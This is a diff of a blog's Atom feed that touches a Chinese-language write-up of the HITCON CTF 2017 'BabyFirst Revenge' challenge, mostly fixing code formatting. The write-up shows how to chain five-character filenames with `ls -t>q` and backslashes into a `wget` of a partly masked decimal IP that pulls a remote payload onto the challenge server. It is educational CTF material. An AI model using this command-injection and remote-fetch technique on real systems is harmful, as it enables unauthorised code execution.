@@ -203,7 +203,7 @@
     <link href="http://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/"/>
     <id>http://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/</id>
     <published>2017-11-04T15:32:08.000Z</published>
-    <updated>2017-11-06T05:34:10.971Z</updated>
+    <updated>2017-11-06T07:28:42.593Z</updated>
     
     <content type="html"><![CDATA[<p>HITCON CTF 2017-BabyFirst Revenge-writeup<br><a id="more"></a></p>
 <h1 id="BabyFirst-Revenge"><a href="#BabyFirst-Revenge" class="headerlink" title="BabyFirst Revenge"></a>BabyFirst Revenge</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Do you remember BabyFirst from HITCON CTF 2015?</div><div class="line">This is the harder version!</div><div class="line">http://52.199.204.34/</div></pre></td></tr></table></figure>
@@ -232,7 +232,7 @@
 <p>其文本内容为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">-t\</div><div class="line">&gt;q</div><div class="line">a</div><div class="line">l\</div><div class="line">s \</div><div class="line">-t\</div><div class="line">&gt;q</div><div class="line">a</div><div class="line">l\</div><div class="line">s \</div></pre></td></tr></table></figure></p>
 <p>由前面所述，错误的命令不会影响后面正确语句的正确执行，所以第一行到第三行是错误的命令可忽略，并且第三行<code>a</code>后没有续行符，这不会影响到下一行。从第四行到第七行，由于续行符（<code>\</code>），可以构成如下的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">l\</div><div class="line">s \</div><div class="line">-t\</div><div class="line">&gt;q</div></pre></td></tr></table></figure></p>
 <p>也即<code>ls -t&gt;q</code>，能够根据文件的时间来进行排序并将结果写入到文件q中。剩余几行，对结果无影响可忽略。</p>
-<p>接下来延续以前的套路，想办法wget远程的某个文件，这样文件中能藏有足够长的payload。为方便起见-，可以将远程服务器的ip转换为十进制，这样不用考虑小数点带来的影响。假设我们的ip转换成十进制后为：2077173<em>48（hh这里我隐去一位数字）。则命令`wget 2077173</em>48<code>，会从</code>2077173*48<code>处下载并默认保存为index.html。考虑到长度的限制，我们需要将上述命令分段成长度小于等于5，并用续行符</code>`隔开。考虑到，前面是使用<code>ls -t&gt;q</code>，而参数<code>-t</code>，会让新生成的文件排在前面，越早生成的文件排在后面。所以构造这一部分的payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;*48</div><div class="line">&gt;173\</div><div class="line">&gt;077\</div><div class="line">&gt;\ 2\</div><div class="line">&gt;et\</div><div class="line">&gt;wg\</div></pre></td></tr></table></figure></p>
+<p>接下来延续以前的套路，想办法wget远程的某个文件，这样文件中能藏有足够长的payload。为方便起见-，可以将远程服务器的ip转换为十进制，这样不用考虑小数点带来的影响。假设我们的ip转换成十进制后为：2077173*48（hh这里我隐去一位数字）。则命令<code>wget 2077173*48</code>，会从<code>2077173*48</code>处下载并默认保存为index.html。考虑到长度的限制，我们需要将上述命令分段成长度小于等于5，并用续行符<code>\</code>隔开。考虑到，前面是使用<code>ls -t&gt;q</code>，而参数<code>-t</code>，会让新生成的文件排在前面，越早生成的文件排在后面。所以构造这一部分的payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt;*48</div><div class="line">&gt;173\</div><div class="line">&gt;077\</div><div class="line">&gt;\ 2\</div><div class="line">&gt;et\</div><div class="line">&gt;wg\</div></pre></td></tr></table></figure></p>
 <p>此时文件目录为：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/5.png?raw=true" alt=""></p>
 <p>接着执行命令<code>sh a</code>，注意文件a是我们第一阶段时生成的，其中包含命令<code>ls -t&gt;q</code>。运行完后查看新生成的文件q：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/6.png?raw=true" alt=""></p>
 <p>如前所述，这里构成了一个新的命令<code>wget 2077173*48</code>。注意在<code>*48</code>的下一行是文件<code>a</code>的名字，由于它后面没有<code>\</code>，并且字母顺序在<code>s\</code>之前，刚好起了一个分割的作用。</p>
@@ -885,9 +885,9 @@
     
       <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
     
-      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
-    
       <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
+    
+      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
     
   </entry>
   
@@ -1447,9 +1447,9 @@
     
       <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
     
-      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
-    
       <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
+    
+      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
     
   </entry>
   
